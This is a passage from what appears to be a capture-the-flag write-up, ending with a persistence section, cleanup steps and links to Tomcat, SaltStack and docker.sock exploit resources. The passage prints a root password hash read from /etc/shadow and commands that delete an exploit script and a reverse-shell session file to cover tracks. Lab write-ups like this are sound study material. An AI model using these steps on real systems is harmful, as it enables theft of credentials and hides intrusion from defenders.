7cfcbb71d11b</span></span></span></code></pre></li><li id="https://www.notion.so/f6a44dec2eaa4bd8a26ca8b2f1efafb5" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root flag!</span></span></li></ul><h2 id="https://www.notion.so/02cb0333a7ed478887163fb9c37a7fc2" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/02cb0333a7ed478887163fb9c37a7fc2"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Persistence</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/7d7e47b3a9864dd0a8742bbcfa386738" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root user&#x27;s hash from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/shadow</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/98757023d09843f1acce38b6fc3da8f5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root:$6$XzluqBeUpIVqOvGi$1ngfZ.wa2hueUAkXFZjRZIyNxuQBboMC5319WC1lQcZORfGF6aKiG1mmnHaNnhFDTLeUknAre9ofC1KD/KvaU0:18430:0:99999:7:::</span></span></span></code></pre></li><li id="https://www.notion.so/33d2899c3dcc4dcbb864eecd6b2d1915" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Clean up after ourselves and delete any residual files, on both the host&#x27;s filesystem and the SaltStack container:</span></span><div id="https://www.notion.so/887e39eb231f495b9f407ad42b5d6c6a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ rm /tmp/.samiko/ds_exploit.sh</code></span></span></p></div><div id="https://www.notion.so/5d872c83e5cd46a5a744d87c68ccda6d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ rm /opt/samples/uploads/reverse.session</code></span></span></p></div></li></ul><h2 id="https://www.notion.so/05eb7c152195453bbaceaaac233ae6f9" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/05eb7c152195453bbaceaaac233ae6f9"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h2><ol class="NumberedListWrapper"><li id="https://www.notion.so/e68bc3af188a4f51a780b68c07aec7d7" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/">https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/</a></span></span></li><li id="https://www.notion.so/806c94fa5da24063b74aab4ab2b63498" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/coinminers-exploit-saltstack-vulnerabilities-cve-2020-11651-and-cve-2020-11652">https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/coinminers-exploit-saltstack-vulnerabilities-cve-2020-11651-and-cve-2020-11652</a></span></span></li><li id="https://www.notion.so/33c3c1fddf0e4ab99a9d0c203cce7f9e" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/jasperla/CVE-2020-11651-poc">https://github.com/jasperla/CVE-2020-11651-poc</a></span></span></li><li id="https://www.notion.so/dacb9c3c8fcb492282196a44e70cfb69" class="NumberedList" value="4"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/">https://dejandayoff.com/the-danger-of-exposing-docker.sock/</a></span></span></li><li id="https://www.notion.so/dccad2e03a7d43baae507c58d19a10f0" class="NumberedList" value="5"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://dreamlab.net/en/blog/post/abusing-dockersock-exposure/">https://dreamlab.net/en/blog/post/abusing-dockersock-exposure/</a></span></span></li></ol></article>
  <footer class="Footer">
        <div>&copy; samiko@127.0.0.1~$ &centerdot; 2021</div>
        <div>&centerdot;</div>
        <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
            rel="noopener noreferrer">Notablog</a>.
        </div>
    </footer>
</body>

</html>
